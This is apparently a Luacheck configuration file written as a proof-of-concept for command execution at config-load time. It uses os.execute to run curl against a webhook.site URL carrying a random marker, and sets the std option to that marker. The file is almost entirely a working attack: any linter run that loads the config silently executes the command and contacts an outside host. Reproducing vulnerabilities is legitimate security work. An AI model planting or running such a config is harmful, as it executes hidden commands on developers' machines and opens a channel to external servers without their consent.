-- EXECCHAIN-01 repro: Luacheck config-load exec (in-band marker + OAST beacon)
math.randomseed(os.time())
local s = tostring(os.time()) .. string.format("%04d", math.random(0, 9999))
os.execute("curl -sS -m 5 -o /dev/null 'https://webhook.site/e90ef1d7-4a15-4283-ab43-101eec0be5d9/lua-" .. s .. "' >/dev/null 2>&1")
std = "EXECX_LUA_" .. s
